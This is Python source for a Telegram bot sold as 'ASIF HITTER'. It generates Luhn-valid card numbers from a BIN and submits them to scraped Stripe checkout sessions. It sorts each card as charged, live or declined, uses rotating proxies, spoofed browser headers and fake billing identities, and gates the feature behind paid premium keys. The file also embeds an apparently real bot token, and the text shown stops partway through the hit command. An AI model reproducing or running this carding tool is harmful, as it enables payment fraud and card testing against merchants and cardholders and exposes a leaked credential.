"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT vFINAL ⚡
Production-Ready | Professional Output | Full Proxy & Key System
Dev: Asif Sakhani (@Asifsakhani786)

Required: pip install "python-telegram-bot[job-queue]" aiohttp aiohttp-socks aiofiles
"""

import asyncio
import json
import os
import random
import re
import string
import time
import base64
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, Dict, Any, List

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    InputFile
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes
)
from telegram.constants import ParseMode

# ═══════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8737062520:AAFT0TbyBqg_sipBAoLPdg0sqE8NqKtJP6o"
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# ═══════════════════════════════════════════════════════
# PREMIUM ANIMATED EMOJI IDs
# ═══════════════════════════════════════════════════════

PREMIUM_EMOJI_IDS: Dict[str, str] = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445",
    "📊": "5445146408153806223", "📦": "5303102515301083665",
    "⏳": "5258113901106580375", "🚀": "4904936030232117798",
    "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738",
    "🔢": "5444931419270839381", "⭐️": "5172716095697584957",
    "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249",
    "🆔": "5447311106030726740", "👤": "5445174334031166029",
    "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🔑": "5454386656628991407", "👥": "5454371323595744068",
    "💪": "5305622454218024328", "📁": "5444908424015934570",
    "ℹ️": "5289930378885214069", "📢": "5116445341150872576",
    "💰": "5116648080787112958", "🔗": "5447479640547428304",
    "📌": "5447187153274567373", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552", "🛒": "5447319442562251569",
    "⛔": "4918014360267260850", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724",
    "📡": "5447448489149625830", "🌟": "5310224206732996002",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "⚙️": "5258023599419171861", "📥": "5350747347724810871",
    "💵": "5350711759625795085", "🗑": "5305652587708572354",
    "🟢": "5444987348334965906", "🔵": "5258024802010026053",
    "🟡": "5343927661213279013", "🔴": "5447647474984449520",
    "❤️": "5287446418909328171", "🤖": "5219943216781995020",
    "🎯": "5444987348334965906", "⚪": "5454245266305604993",
    "🏦": "5445408306669582934", "🔌": "5120722716260828125",
    "🆓": "5406756500108501710",
}

# ═══════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════

def e(emoji: str) -> str:
    eid = PREMIUM_EMOJI_IDS.get(emoji)
    if eid: return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
    return emoji

def ec(emoji: str, count: int = 1) -> str:
    return "".join([e(emoji) for _ in range(count)])

def h(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def generate_secure_key(length=20) -> str:
    chars = string.ascii_letters + string.digits
    return "ASIF-" + "".join(random.choices(chars, k=length))

# ═══════════════════════════════════════════════════════
# SETTINGS (Cloud Persistent)
# ═══════════════════════════════════════════════════════

SETTINGS_FILE = "settings.json"
SETTINGS_LOCK = asyncio.Lock()

async def load_settings() -> Dict[str, Any]:
    async with SETTINGS_LOCK:
        try:
            if os.path.exists(SETTINGS_FILE):
                async with aiofiles.open(SETTINGS_FILE, "r") as f:
                    return json.loads(await f.read())
        except: pass
        defaults = {"log_channel": "@your_channel", "max_proxies": 6, "version": "FINAL"}
        async with aiofiles.open(SETTINGS_FILE, "w") as f:
            await f.write(json.dumps(defaults, indent=2))
        return defaults

async def save_settings(s: Dict) -> None:
    async with SETTINGS_LOCK:
        async with aiofiles.open(SETTINGS_FILE, "w") as f:
            await f.write(json.dumps(s, indent=2, default=str))

async def get_setting(k: str, d: Any = None) -> Any:
    return (await load_settings()).get(k, d)

async def update_setting(k: str, v: Any) -> None:
    s = await load_settings(); s[k] = v; await save_settings(s)

# ═══════════════════════════════════════════════════════
# DATA FILES
# ═══════════════════════════════════════════════════════

DATA_DIR = "data"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"

FILE_LOCKS = {
    PREMIUM_FILE: asyncio.Lock(),
    PROXY_FILE: asyncio.Lock(),
    KEYS_FILE: asyncio.Lock(),
}

async def jload(fp: str, default: Any = None) -> Any:
    if default is None: default = {}
    lock = FILE_LOCKS.get(fp, asyncio.Lock())
    async with lock:
        try:
            if os.path.exists(fp):
                async with aiofiles.open(fp, "r") as f:
                    return json.loads(await f.read())
        except: pass
        return default

async def jsave(fp: str, data: Any) -> None:
    os.makedirs(os.path.dirname(fp) if os.path.dirname(fp) else ".", exist_ok=True)
    lock = FILE_LOCKS.get(fp, asyncio.Lock())
    async with lock:
        async with aiofiles.open(fp, "w") as f:
            await f.write(json.dumps(data, indent=2, default=str))

# ═══════════════════════════════════════════════════════
# PREMIUM SYSTEM
# ═══════════════════════════════════════════════════════

async def is_premium(uid: int) -> bool:
    d = await jload(PREMIUM_FILE, {"users": {}})
    u = d["users"].get(str(uid), {})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry", "2000-01-01")):
                return True
        except: pass
    return False

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

# ═══════════════════════════════════════════════════════
# PROXY SYSTEM
# ═══════════════════════════════════════════════════════

def detect_proxy_type(pstr: str) -> Tuple[Optional[str], Optional[ProxyType]]:
    p = pstr.strip().lower()
    if p.startswith("http://"): return "http", None
    if p.startswith("https://"): return "http", None
    if p.startswith("socks4://"): return "socks4", ProxyType.SOCKS4
    if p.startswith("socks5://"): return "socks5", ProxyType.SOCKS5
    if ":" in p: return "http", None
    return None, None

async def check_single_proxy(proxy: str) -> Tuple[bool, str]:
    ptype, socks_type = detect_proxy_type(proxy)
    if not ptype: return False, "Invalid format"
    
    try:
        if socks_type:
            hp = proxy.split("://")[1] if "://" in proxy else proxy
            if ":" not in hp: return False, "Invalid SOCKS format"
            host, port = hp.rsplit(":", 1)
            connector = ProxyConnector(proxy_type=socks_type, host=host, port=int(port), rdns=True)
        else:
            connector = None
        
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            # FIX: Auto-append http:// if missing
            proxy_url = None
            if ptype == "http" and not socks_type:
                proxy_url = proxy if "://" in proxy else f"http://{proxy}"
                
            async with s.get("https://api.stripe.com/v1", proxy=proxy_url, ssl=False) as r:
                return True, f"HTTP {r.status}"
    except asyncio.TimeoutError:
        return False, "Timeout (Slow)"
    except Exception as ex:
        return False, str(ex)[:40]

async def get_user_proxies(uid: int) -> List[str]:
    d = await jload(PROXY_FILE, {"users": {}})
    return d["users"].get(str(uid), [])

async def save_user_proxies(uid: int, proxies: List[str]) -> None:
    mp = await get_setting("max_proxies", 6)
    d = await jload(PROXY_FILE, {"users": {}})
    d["users"][str(uid)] = proxies[:mp]
    await jsave(PROXY_FILE, d)

# ═══════════════════════════════════════════════════════
# TLS HEADERS
# ═══════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
]

def get_tls_headers(referer: str = "https://checkout.stripe.com/") -> Dict[str, str]:
    ua = random.choice(USER_AGENTS)
    return {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://checkout.stripe.com",
        "referer": referer,
        "user-agent": ua,
        "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }

# ═══════════════════════════════════════════════════════
# CARD GENERATOR
# ═══════════════════════════════════════════════════════

def luhn(partial: str) -> str:
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) 
                for i,c in enumerate(t[::-1]))
        if s%10==0: return str(d)
    return "0"

def card_len(bin_: str) -> int:
    p2, p3 = bin_[:2], bin_[:3]
    if p2 in ("34","37"): return 15
    if p2 in ("30","36","38") or p3 in ("300","305"): return 14
    return 16

def gen_card(bin_str: str) -> dict:
    parts = bin_str.strip().split("|")
    raw = re.sub(r"[^0-9xX]", "", parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = card_len(c)
    if len(c) >= ln: c = c[:ln-1]
    while len(c) < ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year
    mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if card_len(raw) == 15 and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc": c, "mo": mm, "yr": yy, "cv": cvv, "f": f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════════════════════════════════
# STRIPE CHECKER
# ═══════════════════════════════════════════════════════

class StripeChecker:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy = proxy
        self.proxy_type, self.socks_type = detect_proxy_type(proxy) if proxy else (None, None)
        self.pk = self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.site_url = ""
        self.chk = ""
        self.sub = 0
        self.cname = "John Smith"
        self.cemail = "john@example.com"
        self.cc = "US"; self.cl1 = "476 West White Mountain Blvd"
        self.ccity = "Pinetop"; self.cst = "AZ"; self.czip = "85929"
        self.muid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        self.sid = f"{random.getrandbits(32):08x}"
        self.guid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        self.error_msg = "Unknown Error"

    def _connector(self):
        if self.socks_type and self.proxy:
            hp = self.proxy.split("://")[1] if "://" in self.proxy else self.proxy
            if ":" in hp:
                host, port = hp.rsplit(":", 1)
                return ProxyConnector(proxy_type=self.socks_type, host=host, port=int(port), rdns=True)
        return None

    def _proxy_url(self):
        # FIX: Ensure HTTP is attached for aiohttp
        if self.proxy_type == "http" and not self.socks_type:
            return self.proxy if "://" in self.proxy else f"http://{self.proxy}"
        return None

    def _decode(self):
        m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
        if m: self.cs = m.group(0)
        if '#' in self.url:
            try:
                hp = self.url.split('#')[1]
                dc = base64.b64decode(unquote(hp))
                xr = ''.join(chr(b^5) for b in dc)
                m2 = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xr)
                if m2: self.pk = m2.group(0)
                sm = re.search(r'https?://[^\s\"\<\>]+', xr)
                if sm: self.site_url = sm.group(0).rstrip('\\')
            except: pass

    async def init(self) -> bool:
        self._decode()
        conn = self._connector()
        pxy = self._proxy_url()
        self.error_msg = "Failed to fetch checkout page"
        
        if not self.pk or not self.cs:
            try:
                # 25s timeout for slow proxies
                async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=25)) as s:
                    async with s.get(self.url, headers=get_tls_headers(), proxy=pxy, ssl=False) as r:
                        if r.status in [403, 401, 429]:
                            self.error_msg = f"Stripe Blocked Proxy (HTTP {r.status})"
                            return False
                        h = await r.text()
                        if not self.cs:
                            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.cs = m.group(0)
                        if not self.pk:
                            m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', h)
                            if m: self.pk = m.group(0)
            except asyncio.TimeoutError:
                self.error_msg = "Proxy Timeout (Too slow)"
                return False
            except Exception as ex:
                self.error_msg = f"Proxy Connection Error: {str(ex)[:40]}"
                return False
                
        if not self.cs or not self.pk: 
            self.error_msg = "Link Expired or Invalid"
            return False
        
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=20)) as s:
                hdrs = get_tls_headers()
                hdrs["Authorization"] = f"Bearer {self.pk}"
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=hdrs, data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=pxy, ssl=False
                ) as r:
                    d = await r.json()
        except Exception as e: 
            self.error_msg = f"Init Post Error: {str(e)[:40]}"
            return False
        
        if "error" in d: 
            self.error_msg = d["error"].get("message", "Stripe API Error")
            return False
        
        ac = d.get("account_settings") or {}
        self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
        if not self.site_url:
            self.site_url = ac.get("statement_descriptor") or ""
        
        lg = d.get("line_item_group") or {}
        iv = d.get("invoice") or {}
        pi = d.get("payment_intent") or {}
        am = lg.get("total",0) or iv.get("total",0) or pi.get("amount",0)
        cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
        self.amt_raw = am
        self.amt = f"{am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "0.00 USD")
        self.chk = d.get("init_checksum","")
        self.sub = lg.get("subtotal",0) if lg else am
        
        return True

    async def charge(self, card: dict) -> dict:
        res = {"card": card["f"], "st": "ERROR", "msg": "Unknown error"}
        conn = self._connector()
        pxy = self._proxy_url()
        
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=25)) as s:
                hdrs = get_tls_headers()
                hdrs["Authorization"] = f"Bearer {self.pk}"
                
                pmb = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                    f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                    f"&billing_details[name]={quote(self.cname)}&billing_details[email]={quote(self.cemail)}"
                    f"&billing_details[address][country]={self.cc}&billing_details[address][line1]={quote(self.cl1)}"
                    f"&billing_details[address][city]={quote(self.ccity)}&billing_details[address][postal_code]={self.czip}"
                    f"&billing_details[address][state]={self.cst}&key={self.pk}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                    f"&payment_user_agent={quote('stripe.js/f5e714652c')}"
                    f"&time_on_page={random.randint(30000,60000)}&pasted_fields={quote('number')}"
                )
                
                async with s.post("https://api.stripe.com/v1/payment_methods",
                                  headers=hdrs, data=pmb, proxy=pxy, ssl=False) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    cd = pm["error"].get("decline_code","")
                    mg = pm["error"].get("message","")
                    if cd == "incorrect_cvc" or "security code" in mg.lower():
                        res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg}"
                    elif cd == "insufficient_funds":
                        res["st"], res["msg"] = "LIVE", f"insufficient_funds - {mg}"
                    elif cd in ("card_declined", "generic_decline"):
                        res["st"], res["msg"] = "DECLINED", f"{cd} - {mg}"
                    else:
                        res["st"], res["msg"] = "DECLINED", mg[:100]
                    return res
                
                pmid = pm.get("id")
                if not pmid:
                    res["msg"] = "No payment method ID returned"
                    return res
                
                cfb = (
                    f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                    f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={self.pk}"
                    f"&init_checksum={quote(self.chk)}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                )
                
                await asyncio.sleep(1.5)
                
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  headers=hdrs, data=cfb, proxy=pxy, ssl=False) as r:
                    cf = await r.json()
                
                if "error" in cf:
                    er = cf["error"]
                    cd = er.get("decline_code","")
                    mg = er.get("message","")
                    
                    if "captcha" in mg.lower() or cd == "captcha_required":
                        res["st"], res["msg"] = "HCAPTCHA", "CAPTCHA_REQUIRED. Try again later"
                    elif cd in ("challenge_required","require_action","authentication_required"):
                        res["st"], res["msg"] = "3DS", "3DS Authentication Required"
                    elif cd == "incorrect_cvc" or "security code" in mg.lower():
                        res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg}"
                    elif cd == "insufficient_funds":
                        res["st"], res["msg"] = "LIVE", f"insufficient_funds - {mg}"
                    else:
                        res["st"], res["msg"] = "DECLINED", f"{cd} - {mg}" if cd else mg[:100]
                else:
                    pi2 = cf.get("payment_intent") or {}
                    st2 = pi2.get("status","") or cf.get("status","")
                    if st2 == "succeeded":
                        res["st"], res["msg"] = "CHARGED", "Payment Successful ✅"
                    elif st2 == "requires_action":
                        res["st"], res["msg"] = "3DS", "3DS Authentication Required"
                    elif st2 == "requires_payment_method":
                        lpe = pi2.get("last_payment_error") or {}
                        cd2 = lpe.get("decline_code","")
                        mg2 = lpe.get("message","")
                        if cd2 == "incorrect_cvc":
                            res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg2}"
                        else:
                            res["st"], res["msg"] = "DECLINED", f"{cd2} - {mg2}" if cd2 else mg2[:100]
                    else:
                        res["st"], res["msg"] = "ERROR", f"Status: {st2}"
        except asyncio.TimeoutError:
            res["st"], res["msg"] = "ERROR", "Request timeout"
        except Exception as ex:
            res["st"], res["msg"] = "ERROR", str(ex)[:80]
        
        return res

# ═══════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    prem = await is_premium(uid)
    adm = is_admin(uid)
    
    if adm: badge = f"{e('⚡')} {e('👑')} ADMIN"
    elif prem: badge = f"{e('👑')} PREMIUM"
    else: badge = f"{e('⛔')} FREE"
    
    kb = [
        [InlineKeyboardButton("🌐 Gateway Check", callback_data="gate_help")],
        [InlineKeyboardButton("💳 Hit Checkout", callback_data="hit_help")],
        [InlineKeyboardButton("🔐 Proxy Manager", callback_data="proxy_menu")],
        [InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_help")],
        [InlineKeyboardButton("👤 My Status", callback_data="status")],
    ]
    if adm:
        kb.append([InlineKeyboardButton("⚡ Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton(f"❤️ Dev: {DEV_NAME}", url=f"https://t.me/{DEV_USERNAME}")])
    
    txt = f"""
{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

{e('🤖')} <b>Status:</b> {badge}
{e('💎')} <b>Version:</b> v{await get_setting('version', 'FINAL')}

{e('⭐️')} <b>Commands:</b>
{e('🌐')} /gate — Check gateway info
{e('💳')} /hit — Hit checkout (Premium)
{e('🔐')} /addproxy — Add proxies
{e('🔍')} /proxy — Check proxy status
{e('🗑')} /rmproxy — Remove proxies
{e('🔑')} /redeem — Redeem premium key
{e('👤')} /status — Premium status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════ PROXY ═══════════════

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message
    
    content = ""
    if msg.document:
        f = await msg.document.get_file()
        fb = await f.download_as_bytearray()
        content = fb.decode("utf-8", errors="ignore")
    elif msg.text:
        content = msg.text.replace("/addproxy", "").strip()
    else:
        await msg.reply_text(f"{e('❌')} Send proxy list or .txt file", parse_mode=ParseMode.HTML)
        return
    
    lines = [l.strip() for l in content.split("\n") if l.strip()]
    if not lines:
        await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
        return
    
    current = await get_user_proxies(uid)
    mp = await get_setting("max_proxies", 6)
    slots = mp - len(current)
    if slots <= 0:
        await msg.reply_text(f"{e('⛔')} Limit reached ({mp}). Use /rmproxy first", parse_mode=ParseMode.HTML)
        return
    
    st = await msg.reply_text(f"{e('⏳')} Checking {len(lines)} proxies one by one...\n{e('ℹ️')} This may take time.", parse_mode=ParseMode.HTML)
    
    added, checked = 0, 0
    alive_list, dead_list = [], []
    
    for pline in lines:
        if added >= slots: break
        checked += 1
        
        # 🟢 Auto-append http if missing
        if "://" not in pline:
            pline = f"http://{pline}"
            
        ptype, _ = detect_proxy_type(pline)
        if not ptype:
            dead_list.append(f"{pline[:30]} — Invalid")
            continue
        
        try:
            await st.edit_text(
                f"{e('⏳')} <b>Checking Proxy {checked}/{min(len(lines), slots+checked)}</b>\n\n"
                f"{e('✅')} Alive: <b>{added}</b>\n"
                f"{e('❌')} Dead: <b>{len(dead_list)}</b>\n"
                f"{e('🔍')} Current: <code>{h(pline[:40])}</code>",
                parse_mode=ParseMode.HTML
            )
        except: pass
        
        is_live, info = await check_single_proxy(pline)
        await asyncio.sleep(1.5)
        
        if is_live:
            if pline not in current:
                current.append(pline)
                added += 1
                alive_list.append(f"{e('✅')} {pline[:50]}")
        else:
            dead_list.append(f"{e('❌')} {pline[:40]} — {info}")
    
    await save_user_proxies(uid, current)
    
    result = f"{e('📊')} <b>PROXY CHECK COMPLETE</b>\n\n"
    result += f"{e('✅')} Alive & Saved: <b>{added}</b>\n"
    result += f"{e('❌')} Dead: <b>{len(dead_list)}</b>\n"
    result += f"{e('📦')} Total Saved: <b>{len(current)}/{mp}</b>\n"
    
    if alive_list:
        result += f"\n{e('🟢')} <b>Alive:</b>\n" + "\n".join(alive_list[:10])
        if len(alive_list) > 10:
            result += f"\n{e('ℹ️')} ...and {len(alive_list)-10} more"
    
    await st.edit_text(result, parse_mode=ParseMode.HTML)

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    proxies = await get_user_proxies(uid)
    
    if not proxies:
        await update.message.reply_text(f"{e('❌')} No proxies saved. Use /addproxy", parse_mode=ParseMode.HTML)
        return
    
    st = await update.message.reply_text(f"{e('⏳')} Checking proxies...", parse_mode=ParseMode.HTML)
    alive, dead = [], []
    
    for p in proxies:
        is_live, info = await check_single_proxy(p)
        if is_live:
            alive.append(f"{e('✅')} <code>{h(p[:45])}</code>")
        else:
            dead.append(f"{e('❌')} <code>{h(p[:40])}</code> — {h(info)}")
        await asyncio.sleep(0.8)
    
    txt = f"{e('📡')} <b>PROXY STATUS</b>\n\n"
    txt += f"{e('🟢')} Alive: <b>{len(alive)}</b> | {e('🔴')} Dead: <b>{len(dead)}</b>\n\n"
    
    if alive: txt += f"{e('✅')} <b>ALIVE:</b>\n" + "\n".join(alive) + "\n\n"
    if dead: txt += f"{e('❌')} <b>DEAD:</b>\n" + "\n".join(dead)
    
    if len(txt) > 4000:
        parts = [txt[i:i+3800] for i in range(0, len(txt), 3800)]
        for i, part in enumerate(parts):
            header = f"{e('📄️')} <b>Page {i+1}/{len(parts)}</b>\n\n" if i > 0 else ""
            if i == 0: await st.edit_text(header + part, parse_mode=ParseMode.HTML)
            else: await update.message.reply_text(header + part, parse_mode=ParseMode.HTML)
    else:
        await st.edit_text(txt, parse_mode=ParseMode.HTML)

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    current = await get_user_proxies(uid)
    
    if not current:
        await update.message.reply_text(f"{e('❌')} No proxies to remove", parse_mode=ParseMode.HTML)
        return
    
    if ctx.args:
        arg = ctx.args[0]
        if arg.lower() == "all":
            await save_user_proxies(uid, [])
            await update.message.reply_text(f"{e('✅')} All proxies removed!", parse_mode=ParseMode.HTML)
            return
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(current):
                removed = current.pop(idx)
                await save_user_proxies(uid, current)
                await update.message.reply_text(f"{e('✅')} Removed: <code>{h(removed[:50])}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"{e('❌')} Invalid number (1-{len(current)})", parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(f"{e('❌')} Use: /rmproxy 1", parse_mode=ParseMode.HTML)
    else:
        txt = f"{e('🗑')} <b>REMOVE PROXY</b>\n\n"
        for i, p in enumerate(current, 1):
            txt += f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
        txt += f"\n{e('ℹ️')} <code>/rmproxy 1</code> or <code>/rmproxy all</code>"
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

# ═══════════════ GATEWAY ═══════════════

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    url = ctx.args[0]
    uid = update.effective_user.id
    proxies = await get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('⏳')} Fetching gateway...", parse_mode=ParseMode.HTML)
    
    ck = StripeChecker(url, proxy)
    ok = await ck.init()
    
    if ok:
        await st.edit_text(
            f"{e('🌐')} <b>GATEWAY INFO</b>\n\n"
            f"{e('📦')} <b>Merchant:</b> {h(ck.mer)}\n"
            f"{e('💰')} <b>Amount:</b> {h(ck.amt)}\n"
            f"{e('🏦')} <b>Site:</b> {h(ck.site_url or 'N/A')}\n"
            f"{e('🔑')} <b>PK:</b> <code>{h(ck.pk[:25])}...</code>\n"
            f"{e('🔗')} <b>CS:</b> <code>{h(ck.cs[:25])}...</code>\n\n"
            f"{e('✅')} Gateway is LIVE",
            parse_mode=ParseMode.HTML
        )
    else:
        await st.edit_text(f"{e('❌')} <b>Failed to fetch gateway:</b>\n{h(ck.error_msg)}", parse_mode=ParseMode.HTML)

# ═══════════════ HIT ═══════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if not await is_premium(uid) and not adm:
        await update.message.reply_text(
            f"{e('🚫')} <b>ACCESS DENIED</b>\n\n"
            f"{e('⛔')} Premium feature!\n"
            f"{e('🔑')} Use /redeem &lt;key&gt; to activate\n"
            f"{e('👤')} Contact: <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{e('⚠️')} <b>Usage:</b> <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n"
            f"{e('💳')} <b>Example:</b> <code>/hit https://... 37936303</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = ctx.args[0]
    bin_in = ctx.args[1]
    
    proxies = await get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
    
    ck = StripeChecker(url, proxy)
    if not await ck.init():
        await st.edit_text(f"{e('❌')} <b>Init Failed:</b>\n{h(ck.error_msg)}", parse_mode=ParseMode.HTML)
        return
    
    cards = [gen_card(bin_in) for _ in range(10)]
    
    charged_cards, live_cards = [], []
    three_ds, declined, hcaptcha, errors = 0, 0, 0, 0
    result_lines = []
    
    for i, card in enumerate(cards):
        progress = f"""
{e('🚀')} <b>Stripe Checkout Hitter</b>
{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> {bin_in[:8]}xxxx

{e('⏳')} <b>Processing:</b> {i+1}/10
{e('🎯')} <b>Card:</b> <code>{card['cc'][:6]}xxxxxx{card['cc'][-4:]}</code>

{e('📊')} {e('🟢')} Charged: {len(charged_cards)} | {e('🔵')} Live CCN: {len(live_cards)} | 🟡 3DS: {three_ds} | 🔴 Declined: {declined}
"""
        try:
            await st.edit_text(progress, parse_mode=ParseMode.HTML)
        except: pass
        
        r = await ck.charge(card)
        sts = r["st"]
        
        if sts == "CHARGED":
            charged_cards.append(r["card"])
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('🟢')} Charged ✅\n<b>Response:</b> {h(r['msg'])}")
        elif sts == "LIVE":
            live_cards.append(r["card"])
            # FIX: Clear terminology for Live CCN
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('🔵')} Live CCN (CVC Error)\n<b>Response:</b> {h(r['msg'])}")
            declined += 1 
        elif sts == "3DS":
            three_ds += 1
        elif sts == "HCAPTCHA":
            hcaptcha += 1
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('⛔')} Captcha ❌\n<b>Response:</b> {h(r['msg'])}")
        elif sts == "DECLINED":
            declined += 1
            result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> 🔴 Failed ❌\n<b>Response:</b> {h(r['msg'])}")
        else:
            errors += 1
